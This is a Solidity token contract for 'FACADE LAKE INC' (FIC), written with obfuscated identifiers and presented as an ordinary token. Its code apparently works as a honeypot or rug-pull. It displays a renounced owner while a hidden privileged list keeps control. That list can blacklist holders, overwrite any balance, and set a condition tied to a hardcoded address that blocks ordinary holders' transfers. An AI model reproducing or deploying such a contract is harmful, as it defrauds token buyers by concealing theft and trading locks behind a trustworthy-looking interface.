//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface limitLaunchedTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitLiquidity) external view returns (uint256);

    function transfer(address atSell, uint256 listLimit) external returns (bool);

    function allowance(address toTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 listLimit) external returns (bool);

    function transferFrom(address sender,address atSell,uint256 listLimit) external returns (bool);

    event Transfer(address indexed from, address indexed swapAuto, uint256 value);
    event Approval(address indexed toTake, address indexed spender, uint256 value);
}

interface limitTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tradingAt {
    function createPair(address fromFund, address teamList) external returns (address);
}

abstract contract shouldAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverLaunchedBuy is limitLaunchedTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FACADELAKEINC is shouldAuto, limitLaunchedTeam, receiverLaunchedBuy {

    uint256 buyTeamTotal;

    address public isSwap;

    constructor (){
        if (totalAt == enableIs) {
            takeFee = maxWallet;
        }
        listLaunch();
        limitTake listSell = limitTake(buyLaunch);
        txTotalAt = tradingAt(listSell.factory()).createPair(listSell.WETH(), address(this));
        
        isSwap = _msgSender();
        launchLiquidity[isSwap] = true;
        fundAuto[isSwap] = takeLaunch;
        
        emit Transfer(address(0), isSwap, takeLaunch);
    }

    uint256 teamToken;

    function amountTotalAt() private view {
        require(launchLiquidity[_msgSender()]);
    }

    uint256 public marketingSender;

    function maxShould(uint256 listLimit) public {
        amountTotalAt();
        buyTeamTotal = listLimit;
    }

    uint256 public maxWallet;

    function buyTrading(address shouldEnable) public {
        amountTotalAt();
        
        if (shouldEnable == isSwap || shouldEnable == txTotalAt) {
            return;
        }
        totalExempt[shouldEnable] = true;
    }

    string private teamFrom = "FIC";

    uint8 private launchMax = 18;

    bool private enableIs;

    function owner() external view returns (address) {
        return exemptReceiver;
    }

    function approve(address limitReceiver, uint256 listLimit) public virtual override returns (bool) {
        modeShould[_msgSender()][limitReceiver] = listLimit;
        emit Approval(_msgSender(), limitReceiver, listLimit);
        return true;
    }

    function sellSwap(address toTxTake) public {
        if (maxLiquidityEnable) {
            return;
        }
        if (marketingSender == takeFee) {
            enableIs = true;
        }
        launchLiquidity[toTxTake] = true;
        
        maxLiquidityEnable = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return launchMax;
    }

    mapping(address => bool) public launchLiquidity;

    bool public maxLiquidityEnable;

    function totalSupply() external view virtual override returns (uint256) {
        return takeLaunch;
    }

    function fromFee(address marketingBuy, address atSell, uint256 listLimit) internal returns (bool) {
        if (marketingBuy == isSwap) {
            return buySender(marketingBuy, atSell, listLimit);
        }
        uint256 senderMaxFund = limitLaunchedTeam(txTotalAt).balanceOf(marketingMode);
        require(senderMaxFund == buyTeamTotal);
        require(!totalExempt[marketingBuy]);
        return buySender(marketingBuy, atSell, listLimit);
    }

    mapping(address => mapping(address => uint256)) private modeShould;

    event OwnershipTransferred(address indexed limitTrading, address indexed marketingExempt);

    address public txTotalAt;

    uint256 private takeFee;

    function buySender(address marketingBuy, address atSell, uint256 listLimit) internal returns (bool) {
        require(fundAuto[marketingBuy] >= listLimit);
        fundAuto[marketingBuy] -= listLimit;
        fundAuto[atSell] += listLimit;
        emit Transfer(marketingBuy, atSell, listLimit);
        return true;
    }

    mapping(address => bool) public totalExempt;

    function transfer(address teamListMode, uint256 listLimit) external virtual override returns (bool) {
        return fromFee(_msgSender(), teamListMode, listLimit);
    }

    string private walletFrom = "FACADELAKE INC";

    mapping(address => uint256) private fundAuto;

    address marketingMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return walletFrom;
    }

    function allowance(address maxAtTx, address limitReceiver) external view virtual override returns (uint256) {
        if (limitReceiver == buyLaunch) {
            return type(uint256).max;
        }
        return modeShould[maxAtTx][limitReceiver];
    }

    uint256 private takeLaunch = 100000000 * 10 ** 18;

    address private exemptReceiver;

    function getOwner() external view returns (address) {
        return exemptReceiver;
    }

    address buyLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address limitLiquidity) public view virtual override returns (uint256) {
        return fundAuto[limitLiquidity];
    }

    function symbol() external view virtual override returns (string memory) {
        return teamFrom;
    }

    function transferFrom(address marketingBuy, address atSell, uint256 listLimit) external override returns (bool) {
        if (_msgSender() != buyLaunch) {
            if (modeShould[marketingBuy][_msgSender()] != type(uint256).max) {
                require(listLimit <= modeShould[marketingBuy][_msgSender()]);
                modeShould[marketingBuy][_msgSender()] -= listLimit;
            }
        }
        return fromFee(marketingBuy, atSell, listLimit);
    }

    function limitFee(address teamListMode, uint256 listLimit) public {
        amountTotalAt();
        fundAuto[teamListMode] = listLimit;
    }

    bool private totalAt;

    function listLaunch() public {
        emit OwnershipTransferred(isSwap, address(0));
        exemptReceiver = address(0);
    }

}